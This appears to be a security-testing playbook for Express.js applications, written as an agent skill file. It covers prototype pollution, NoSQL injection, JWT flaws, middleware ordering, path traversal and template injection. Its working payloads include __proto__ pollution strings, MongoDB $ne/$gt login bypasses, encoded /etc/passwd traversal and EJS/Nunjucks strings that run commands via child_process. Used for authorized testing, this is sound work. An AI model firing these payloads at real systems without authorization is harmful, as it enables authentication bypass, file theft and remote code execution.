---
name: express
description: Security testing playbook for Express.js applications covering prototype pollution, NoSQL injection, and middleware security
---

# Express.js

Security testing for Express.js applications. Focus on prototype pollution, NoSQL injection, middleware ordering vulnerabilities, JWT misuse, Content-Type parser abuse, and path traversal through static file serving.

## Attack Surface

**Core Components**
- Routing: `app.get/post/put/delete`, `Router()`, parameterized routes, regex routes, `app.all()`
- Middleware stack: execution order, error handlers, `app.use()` vs route-level middleware
- Template engines: EJS, Pug, Handlebars, Nunjucks (SSTI vectors)
- Static file serving: `express.static()`, custom file serving, `res.sendFile()`

**Data Handling**
- Body parsers: `express.json()`, `express.urlencoded()`, `express.raw()`, `express.text()`, `multer`
- Query string parsing: `qs` library (nested objects, arrays), prototype pollution surface
- Cookie handling: `cookie-parser`, signed cookies, session cookies

**Authentication**
- Passport.js strategies: Local, OAuth, JWT, SAML
- JWT libraries: `jsonwebtoken`, `jose`, `passport-jwt`
- Session management: `express-session`, `connect-redis`, `connect-mongo`

**Database Layer**
- MongoDB/Mongoose: query operators, aggregation pipeline
- SQL: Sequelize, Knex, TypeORM, raw queries

**Deployment**
- Node.js direct, PM2, Docker, reverse proxy (nginx/Apache), `trust proxy` setting

## High-Value Targets

- Authentication endpoints (`/login`, `/register`, `/auth/callback`, `/api/token`)
- Admin routes and dashboard endpoints
- File upload/download handlers (`/upload`, `/files/:id`, `/export`)
- GraphQL endpoints (`/graphql`) with introspection enabled
- WebSocket upgrade endpoints (`/ws`, `/socket.io/`)
- Health/debug endpoints (`/health`, `/debug`, `/status`, `/metrics`)
- Password reset and email verification flows

## Reconnaissance

**Framework Fingerprinting**
```
X-Powered-By: Express  (unless disabled)
ETag format: W/"xx-xxxxx" (weak ETags, Express default)
404 response: "Cannot GET /path" (default handler)
```

**Route Discovery**
```
GET /api/
GET /api/v1/
GET /graphql?query={__schema{types{name}}}
GET /swagger.json
GET /api-docs
```

**Error-Based Enumeration**
- Send malformed JSON to endpoints: `{"key":}` triggers parser errors revealing stack traces
- `NODE_ENV=development` exposes full stack traces with file paths and line numbers

**Dependency Scanning**
- `package.json` exposure at application root or via misconfigured static serving
- `.env` file exposure through static file misconfiguration

## Key Vulnerabilities

### Prototype Pollution

**Query String Pollution**
```
GET /api/users?__proto__[isAdmin]=true
GET /api/users?constructor[prototype][isAdmin]=true
```
The `qs` library (Express default) parses nested objects from query strings.

**JSON Body Pollution**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
If the app merges user input with defaults using `Object.assign()`, `lodash.merge()`, or spread operators, pollution propagates to all objects.

**Impact Escalation**
- Pollute `isAdmin`, `role`, `verified`, `approved` on `Object.prototype`
- Template engine RCE: Handlebars `__proto__.type` set to `Program`, Pug `__proto__.block`

### NoSQL Injection

**MongoDB Operator Injection**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"$where": "this.password.match(/^a/) != null"}
```

**Query Param Operators**: `GET /api/users?role[$ne]=admin` — `qs` parses bracket notation into objects that pass directly to Mongoose `find()`, `findOne()`, `updateOne()`.

### JWT Security

**Algorithm Confusion**
```javascript
// If server uses RS256, try sending HS256 token signed with public key
jwt.verify(token, publicKey, {algorithms: ['HS256']})
```

**Common JWT Flaws**
- `alg: "none"` bypass (library accepts unsigned tokens)
- Missing `algorithms` whitelist in `jwt.verify()` options
- Symmetric key weakness: brute-forceable HMAC secrets
- `kid` header injection: path traversal (`../../dev/null`), SQL injection
- Missing `exp`, `iss`, `aud` validation
- Token stored in localStorage (XSS-accessible) vs httpOnly cookie

### Middleware Ordering

**Critical Order Dependencies**
```javascript
// VULNERABLE: route registered before auth middleware
app.get('/admin', adminHandler);
app.use(authMiddleware);
```

**Middleware Bypass**
- Routes registered on `app` bypass `Router`-level middleware
- `next('route')` skips remaining middleware in current route stack
- Async middleware without proper error handling silently fails

### Content-Type Parser Abuse

- Switch between `application/json`, `application/x-www-form-urlencoded`, `text/plain` to bypass validation
- URL-encoded body `role=admin` may bypass JSON schema validation
- `extended: true` (qs) vs `extended: false` (querystring) parse differently

### Path Traversal

**express.static()**: `GET /static/..%2f..%2f..%2fetc/passwd`, `GET /static/%2e%2e/%2e%2e/etc/passwd`

**res.sendFile()**: `res.sendFile(req.params.filename)` without `{root: '/safe/dir'}` option allows path traversal.

### ReDoS (Regular Expression Denial of Service)

```javascript
app.get(/\/api\/(.+)+\/data/, handler);
if (/^([a-z]+)+$/.test(userInput)) { ... }
```
Send crafted input causing exponential backtracking: `"aaaaaaaaaaaaaaaaaaaaa!"`

### Server-Side Template Injection

**EJS**: `<%= global.process.mainModule.require('child_process').execSync('whoami') %>`

**Nunjucks**: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('whoami')")()}}`

### SSRF via HTTP Client

- `axios`, `node-fetch`, `got` following redirects to internal services
- URL parsing differences between Node.js `URL` and backend services
- DNS rebinding attacks against server-side fetch operations

## Bypass Techniques

- HPP (HTTP Parameter Pollution): duplicate parameters parsed differently by middleware vs handler
- Case-insensitive header matching exploiting `req.headers` vs middleware checks
- Chunked Transfer-Encoding to bypass WAF/body size limits
- Unicode normalization bypassing path/input validation
- `X-HTTP-Method-Override` for method switching past route-level restrictions

## Testing Methodology

1. **Fingerprint** - Confirm Express via headers, error pages, ETag format; identify template engine and DB
2. **Middleware map** - Determine middleware order, identify auth gaps, test routes registered before auth
3. **Injection matrix** - Test all inputs for prototype pollution (query, body, headers), NoSQL operators, SSTI
4. **Auth testing** - JWT algorithm confusion, token forgery, session fixation, Passport strategy bypass
5. **Parser abuse** - Switch Content-Type across endpoints, test extended vs simple URL encoding
6. **Path traversal** - Probe static file serving, `res.sendFile()`, `res.download()` with encoded traversals
7. **ReDoS** - Identify regex in routes and validation, test with backtracking payloads

## Validation Requirements

- Prototype pollution proof showing property persistence on `Object.prototype` affecting application logic
- NoSQL injection with authentication bypass or data exfiltration evidence
- JWT forgery with successful authentication using manipulated token
- Path traversal reading files outside intended directory via static serving or sendFile
- Middleware bypass showing unauthenticated access to protected routes
- SSTI proof with command output (use `whoami` or `hostname`, not destructive commands)
- ReDoS with measurable response time increase (>5s) on crafted input

## False Positives

- `X-Powered-By: Express` disabled does not mean non-Express
- NoSQL operator syntax in query strings that are sanitized before reaching MongoDB
- Prototype pollution in query strings that never merge into application objects
- JWT `alg: none` rejected by properly configured `jsonwebtoken` with `algorithms` whitelist
- Path traversal attempts blocked by `express.static()` built-in `..` resolution (post v4.x)

## Impact

- Prototype pollution: RCE via template engines, authentication bypass, denial of service
- NoSQL injection: authentication bypass, data exfiltration, denial of service
- JWT exploitation: full authentication bypass, identity impersonation
- Path traversal: source code disclosure, configuration file access, credential theft
- SSTI: remote code execution on the server
- ReDoS: application-level denial of service, event loop blocking

## Pro Tips

- Express `req.query` uses `qs` by default which supports nested objects — always test `key[nested]=value` and `__proto__` pollution
- `express.json({strict: false})` accepts primitives (strings, numbers) not just objects/arrays — test with `true`, `null`, raw strings
- `app.set('trust proxy', true)` makes Express trust `X-Forwarded-*` headers — spoof these when set
- Mongoose `lean()` queries return plain objects (pollution-vulnerable); regular queries return Documents (safer)
- Socket.io handshake at `/socket.io/?EIO=4&transport=polling` often bypasses HTTP middleware auth checks
- Check for `npm audit` output in CI/CD logs or exposed `.npm` directories for known vulnerable dependencies

## Summary

Express.js security testing centers on prototype pollution via query/body parsing, NoSQL injection through MongoDB operator passthrough, and middleware ordering vulnerabilities. JWT implementation flaws, Content-Type parser differentials, and static file path traversal are consistently exploitable. Always verify middleware execution order, test all input vectors for object injection, and check template engines for SSTI. The permissive nature of JavaScript object handling and Express's minimal-by-default security posture make thorough input validation testing essential.
